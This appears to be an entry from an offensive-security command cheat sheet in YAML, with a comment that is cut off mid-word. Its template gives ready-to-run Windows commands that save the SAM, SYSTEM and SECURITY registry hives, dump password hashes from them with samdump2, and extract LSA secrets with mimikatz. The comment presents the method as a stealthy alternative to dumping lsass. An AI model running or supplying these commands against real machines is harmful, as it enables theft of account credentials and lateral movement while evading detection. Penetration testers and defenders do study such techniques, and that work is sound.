commands:
- template: "# The following command will dump the SAM, SYSTEM, and SECURITY hives to the current directory.\n\
    reg save HKLM\\SAM sam.hive\nreg save HKLM\\SYSTEM system.hive\nreg save HKLM\\SECURITY security.hive\n\
    \n#Assuming you have transfered the hives to your kali\nsamdump2 system sam \n\n#We can also get lsa\
    \ secrets via mimikatz\nlsadump::secrets /system:c:\\temp\\system.hive /security:c:\\temp\\security.hive"
  comment: 'The lsass Process while great, is no where neaar the only way to dump credintials from windows.
    One of which is access the three registry hives: SAM, SYSTEM, and SECURITY. This is a method that
    can be used to dump credentials without mimikatz as well as offer some potenial stealt'
